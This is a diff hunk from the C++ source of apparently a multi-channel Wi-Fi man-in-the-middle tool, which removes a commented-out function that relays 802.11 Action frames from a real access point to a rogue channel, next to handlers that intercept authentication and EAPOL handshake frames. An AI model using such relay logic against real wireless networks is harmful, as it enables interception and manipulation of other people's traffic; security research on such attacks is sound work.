@@ -42,38 +42,6 @@ FrameProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, cons
 	return CONTINUE;
 }
 
-/*FrameProcess McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const vector<unsigned char> &raw,
-								const Dot11 &dot11
-) const{
-	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return CONTINUE;
-	if(dot11.wep()){
-		if(addr2 == ap.get(SK::mac)){
-			display_traffic(dot11, "Real channel", " -- MitM");
-			send_to_rogue(raw);
-			return STOP;
-		}
-	}
-
-	const auto serialization = const_cast<Dot11&>(dot11).serialize();
-	if(serialization.size() < 25) return CONTINUE;
-	const uint8_t category = serialization[24];
-
-	if(category == 0){
-		log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
-		return STOP;
-	}
-
-	const HWAddress<6> src(serialization.data() + 10);
-	const HWAddress<6> dst(serialization.data() + 4);
-
-	if(src == ap.get(SK::mac) && client_state.get_mac() == dst){
-		send_to_rogue(pdu);
-		log(LogLevel::DEBUG, "Real channel: Action(cat={}) -> rogue channel", category);
-		return STOP;
-	}
-	return CONTINUE;
-}*/
-
 FrameProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const{
 	// EAPOL AP -> STA on real channel
 	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)){
